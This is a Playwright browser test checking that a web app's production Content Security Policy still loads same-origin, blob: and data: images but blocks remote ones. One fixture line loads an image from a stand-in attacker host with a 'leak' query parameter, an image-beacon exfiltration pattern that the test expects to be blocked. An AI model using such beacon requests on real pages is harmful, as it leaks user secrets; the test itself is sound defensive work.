import { expect, test } from '@playwright/test';
import { buildCsp } from '../../src/lib/csp';

/**
 * GOO-722: under the production CSP, the image sources the app uses still
 * load (same-origin assets, blob: previews such as the document inline viewer
 * and artifact preview, data: images such as the entity-graph export), and an
 * arbitrary https image is blocked before any request leaves the page.
 */
const host = 'https://csp-images.test';
const nonce = 'Y3NwLWltYWdlcy1icm93c2Vy';
const csp = buildCsp(nonce, { NODE_ENV: 'production' });

// 1x1 transparent PNG.
const PNG = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=',
  'base64'
);

test('img-src allows self, blob: and data: and blocks remote https', async ({
  page,
}) => {
  const remoteRequests: string[] = [];
  const violations: string[] = [];
  page.on('console', (msg) => {
    if (/Content Security Policy/i.test(msg.text())) violations.push(msg.text());
  });

  await page.route('https://attacker.example/**', (route) => {
    remoteRequests.push(route.request().url());
    return route.fulfill({ contentType: 'image/png', body: PNG });
  });
  await page.route(`${host}/**`, (route) => {
    const url = new URL(route.request().url());
    if (url.pathname === '/logo.png') {
      return route.fulfill({ contentType: 'image/png', body: PNG });
    }
    return route.fulfill({
      contentType: 'text/html',
      headers: { 'Content-Security-Policy': csp },
      body: `<!doctype html><body><script nonce="${nonce}">
        window.loadImage = (src) => new Promise((resolve) => {
          const img = new Image();
          img.onload = () => resolve('loaded');
          img.onerror = () => resolve('blocked');
          img.src = src;
          document.body.appendChild(img);
        });
      </script></body>`,
    });
  });

  await page.goto(`${host}/`);

  const dataUrl = `data:image/png;base64,${PNG.toString('base64')}`;
  const results = await page.evaluate(async (data) => {
    const load = (window as unknown as {
      loadImage: (src: string) => Promise<string>;
    }).loadImage;
    // Built in memory, not fetched: connect-src does not allow data:.
    const bytes = Uint8Array.from(atob(data.split(',')[1]), (c) =>
      c.charCodeAt(0)
    );
    const blobUrl = URL.createObjectURL(
      new Blob([bytes], { type: 'image/png' })
    );
    return {
      self: await load('/logo.png'),
      blob: await load(blobUrl),
      data: await load(data),
      remote: await load(
        'https://attacker.example/pixel.png?leak=thread-secret'
      ),
    };
  }, dataUrl);

  expect(results).toEqual({
    self: 'loaded',
    blob: 'loaded',
    data: 'loaded',
    remote: 'blocked',
  });
  expect(remoteRequests).toEqual([]);
  expect(violations.some((text) => text.includes('img-src'))).toBe(true);
});
